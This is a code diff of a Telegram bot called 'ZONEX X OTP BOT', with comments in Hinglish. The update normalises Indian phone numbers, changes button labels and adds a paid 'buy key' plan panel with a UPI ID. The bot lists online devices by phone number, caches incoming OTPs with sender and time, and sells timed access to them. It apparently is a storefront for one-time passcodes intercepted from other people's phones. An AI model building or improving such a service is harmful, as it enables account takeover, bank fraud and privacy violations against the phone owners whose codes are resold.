@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.5              ║
-║  Fixed Duplicate Numbers & Fast OTP      ║
+║        ZONEX X OTP BOT v5.7              ║
+║  Fixed All Issues & Premium UI           ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -27,10 +27,10 @@ _admin_ids_setting = (
     or "8917259924"
 )
 ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.strip()]
-ADMIN_USERNAME = "@AG14447"
+ADMIN_USERNAME = "@AG01448"  # <--- Updated Username
 BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
-AUTO_REFRESH   = 3  # <--- FIX 1: Auto refresh fast kiya (10s se 3s)
+AUTO_REFRESH   = 3  # Fast Auto Refresh
 
 # ─── Firebase Configuration ─────────────────────────────────────────────────
 FIREBASE_CONFIG = {
@@ -565,7 +565,7 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  ★★★ FIX 2: DUPLICATE NUMBERS HATANE KA FUNCTION ★★★
+#  ★★★ FIXED: DUPLICATE NUMBERS HATANE KA FUNCTION ★★★
 # ══════════════════════════════════════════════════════════════════════════════
 def all_online() -> list:
     seen_numbers = set()
@@ -574,13 +574,27 @@ def all_online() -> list:
     for lb, dm in device_cache.items():
         for did, info in dm.items():
             if info.get("online"):
-                phone = info.get("phone", "—")
+                raw_phone = info.get("phone", "—")
+                if raw_phone == "—":
+                    continue
                 
-                # Agar same number pehle aa chuka hai toh skip karo
-                if phone != "—":
-                    if phone in seen_numbers:
-                        continue
-                    seen_numbers.add(phone)
+                # Sirf pure digits nikalo (space, +91, -, sab remove)
+                clean_digits = re.sub(r'\D', '', str(raw_phone))
+                
+                # Last 10 digits uthao (kyunki 10 digit number hota hai)
+                if len(clean_digits) >= 10:
+                    clean_phone = clean_digits[-10:]
+                else:
+                    clean_phone = clean_digits
+                
+                # Check karo duplicate toh nahi hai
+                if clean_phone in seen_numbers:
+                    continue 
+                    
+                seen_numbers.add(clean_phone)
+                
+                # Format karke wapas set karo taaki UI mein acha dikhe
+                info["phone"] = f"+91{clean_phone}" if len(clean_phone) == 10 else clean_phone
                 
                 online_devices.append((lb, did, info))
                 
@@ -818,6 +832,46 @@ def txt_expired(name: str) -> str:
 def get_referral_hours() -> float:
     return float(data.get("referral_hours", 1))
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  ★★★ PREMIUM BUY PLANS TEXT ★★★
+# ══════════════════════════════════════════════════════════════════════════════
+def txt_buy_plans_panel(uid: int) -> str:
+    plans = data.get("pricing_plans", [])
+    upi   = data.get("upi_id", "") or "Not Set"
+    
+    plan_lines = []
+    for p in plans:
+        h = p['hours']
+        if h >= 720:   dur = f"{int(h//720)} Month"
+        elif h >= 168: dur = f"{int(h//168)} Week"
+        elif h >= 24:  dur = f"{int(h//24)} Din"
+        else:          dur = f"{h} hours"
+        
+        icon = "📦"
+        
+        plan_lines.append(f"{icon} {dur} — 💵 ₹{p['price']}")
+        
+    plans_text = "\n".join(plan_lines)
+    
+    return (
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"💎 <b>ZONEX X OTP</b>\n"
+        f"💵 <b>BUY KEY</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"✨ <b>Choose Your Perfect Plan</b>\n\n"
+        f"Niche se apna plan choose karo 👇\n"
+        f"<i>Plan pe tap karo — QR, UPI aur details dekhne ke liye.</i>\n\n"
+        f"╭──────────────────────╮\n"
+        f"💳 Secure Payment\n"
+        f"📱 UPI Available\n"
+        f"📦 Choose Your Plan\n"
+        f"╰──────────────────────╯\n\n"
+        f"{plans_text}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"💳 <b>UPI ID:</b> <code>{upi}</code>\n\n"
+        f"👑 {ADMIN_USERNAME}"
+    )
+
 # ─── Keyboards ────────────────────────────────────────────────────────────────
 def kb_main(uid: int) -> InlineKeyboardMarkup:
     rows = [
@@ -836,6 +890,7 @@ def kb_back(page: str = "main_menu") -> InlineKeyboardMarkup:
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh"),
     ]])
 
+# ★★★ FIXED: Button text mein se [0🔑] hata diya gaya hai ★★★
 def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     start = page * DEVICES_PER_PAGE
     chunk = devices[start:start+DEVICES_PER_PAGE]
@@ -843,11 +898,11 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     for i in range(0, len(chunk), 2):
         row = []
         for lb, did, info in chunk[i:i+2]:
-            cnt  = len(otp_cache.get(lb,{}).get(did,[]))
             ph   = info.get("phone","—") or "—"
             ph_short = ph[-10:] if ph != "—" else "—"
             esc  = lb.replace(":","_")
-            row.append(InlineKeyboardButton(f"🟢 {ph_short} [{cnt}🔑]",
+            # Yahan sirf number dikhega, keys nahi
+            row.append(InlineKeyboardButton(f"🟢 {ph_short}",
                                             callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
@@ -884,6 +939,7 @@ def kb_expired() -> InlineKeyboardMarkup:
          InlineKeyboardButton("👥 Refer & Earn",  callback_data="refer")],
     ])
 
+# ★★★ PREMIUM PLAN BUTTONS (Screenshot wale) ★★★
 def kb_plans_user() -> InlineKeyboardMarkup:
     plans = data.get("pricing_plans", [])
     rows = []
@@ -892,10 +948,12 @@ def kb_plans_user() -> InlineKeyboardMarkup:
         if h >= 720:   dur = f"{int(h//720)} Month"
         elif h >= 168: dur = f"{int(h//168)} Week"
         elif h >= 24:  dur = f"{int(h//24)} Din"
-        else:          dur = f"{h}h"
+        else:          dur = f"{h} hours"
+        
         rows.append([InlineKeyboardButton(
-            f"📦 {dur}  ·  {int(h)}h  ·  ₹{p['price']}",
+            f"📦 {dur} · ₹{p['price']}",
             callback_data=f"buy_plan:{p['id']}")])
+            
     rows.append([InlineKeyboardButton("◀️ KEY SYSTEM", callback_data="user_panel")])
     return InlineKeyboardMarkup(rows)
 
@@ -1356,7 +1414,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         last_refresh = now_dt().strftime("%H:%M:%S")
 
         devs = all_online()
-        total_online_all = count_online()
+        total_online_all = len(devs) 
         total_devices_all = count_total()
 
         if not devs:
@@ -1445,7 +1503,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if otp_to_show is None and cfg:
             known_key = (fresh_otps[0]["otp"], fresh_otps[0]["sender"], fresh_otps[0]["time"]) \
                         if fresh_otps else None
-            # FIX 3: Wait time kam kiya (30s se 15s) aur loop speed badhayi (3s se 1s)
+            # Fast Wait time 15s, check har 1s
             deadline = asyncio.get_event_loop().time() + 15
             while asyncio.get_event_loop().time() < deadline:
                 await asyncio.sleep(1)
@@ -1540,12 +1598,12 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                     InlineKeyboardButton("◀️ KEY SYSTEM", callback_data="user_panel")
                 ]]))
             return
+        # Naya Premium Text Function call kiya
         await q.edit_message_text(
-            f"💰 <b>Buy Key — Plans</b>\n{'─'*28}\n\n"
-            f"Niche se apna plan choose karo 👇\n\n"
-            f"<i>Plan pe tap karo — QR, UPI aur details dekhne ke liye.</i>",
+            txt_buy_plans_panel(uid),
             reply_markup=kb_plans_user(),
-            parse_mode="HTML")
+            parse_mode="HTML"
+        )
 
     elif cb.startswith("buy_plan:"):
         plan_id = cb.split(":", 1)[1]
@@ -2640,7 +2698,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.5 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.7 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
